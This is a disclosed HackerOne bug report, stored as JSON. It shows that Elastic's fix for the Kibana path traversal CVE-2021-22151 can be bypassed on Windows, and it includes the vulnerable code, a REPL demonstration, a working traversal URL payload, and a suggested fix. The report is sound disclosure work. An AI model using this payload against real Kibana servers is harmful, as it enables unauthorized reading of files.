{
  "id": 1353603,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUzNjAz",
  "url": "https://hackerone.com/reports/1353603",
  "title": "Fix for CVE-2021-22151 (Kibana path traversal issue) can be bypassed on Windows",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2021-09-28T12:50:52.455Z",
  "submitted_at": "2021-09-28T12:50:52.752Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dee-see",
    "url": "/dee-see",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23607,
    "url": "https://hackerone.com/elastic",
    "handle": "elastic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Elastic",
      "twitter_handle": "elastic",
      "website": "https://www.elastic.co/",
      "about": "Search, solve, and succeed with one platform, three search-powered solutions, built on a single technology stack"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-22151"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-15T20:32:12.172Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-15T20:32:12.098Z",
  "team_member_agreed_on_going_public_at": "2021-11-15T20:28:28.095Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nHello team, I hope you're doing well! I was combing through your GitHub repository to look at the fixes for recent security releases and found [the fix for CVE-2021-22151](https://github.com/elastic/kibana/pull/107768) to be incomplete. The current fix makes assumptions that are true on Linux but that don't hold on Windows.\n\n## Details\n\nThe [fixed code](https://github.com/elastic/kibana/blob/62e7deee3c03cde99ae8f5da37352d0d5bd54d84/x-pack/plugins/maps/server/routes.js#L490-L494) looks like this\n\n```typescript\n      const range = path.normalize(request.params.range);\n      return range.startsWith('..')\n        ? response.notFound()\n        : new Promise((resolve) => {\n            const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);\n            fs.readFile(fontPath, (error, data) => {\n                // snipped\n            });\n          });\n```\n\nThe assumption is that any path traversal attempts, once normalized, will start with `..`. This seems to hold on Linux, however on Windows this can happen (using the NodeJS REPL for demonstration here):\n\n```javascript\n> let range = path.normalize('c:../../../../../../../path_traversal')\nundefined\n> console.log(range)\nc:..\\..\\..\\..\\..\\..\\..\\path_traversal\n> range.startsWith('..')\nfalse\n> const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);\nundefined\n> console.log(fontPath)\nc:\\path_traversal.pbf\n```\n\nPath traversal happened even if the `range` didn't start with `..`.\n\n## Steps to reproduce\n\nThis requires Kibana to be installed on Windows.\n\n1. Put a `.pbf` file somewhere on disk for demonstration. I did it with `echo hax > c:\\path_traversal.pbf`\n1. Visit <http://localhost:5601/api/maps/fonts/open_sans/c%3A..%2F..%2F..%2F..%2F..%2F..%2F..%2Fpath_traversal> and the file from the previous step will be downloaded\n    1. You might need to add some `..%2f` depending on how deep Kibana is installed.\n\n## Remediation\n\nThom Heymann already had a great suggestion [in their code review](https://github.com/elastic/kibana/pull/107768/files#r683586289)\n\n> The best way to solve this is to resolve the path from range and ensure it is inside your fonts directory.\n\nI think this would fix the issue once and for all!\n\n## Impact\n\nPath traversal disclosing `.pbf` files",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-12-15T20:28:28.275Z",
  "allow_singular_disclosure_after": -68233762.5313445,
  "singular_disclosure_allowed": true,
  "vote_count": 9,
  "voters": [
    "youstin",
    "akashhamal0x01",
    "0xwise",
    "official_blackhat13",
    "waseeld",
    "wololosan",
    "testwlp",
    "nasarasolomon",
    "meispi"
  ],
  "severity": {
    "rating": "low",
    "score": 3.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 438736,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "Kibana",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
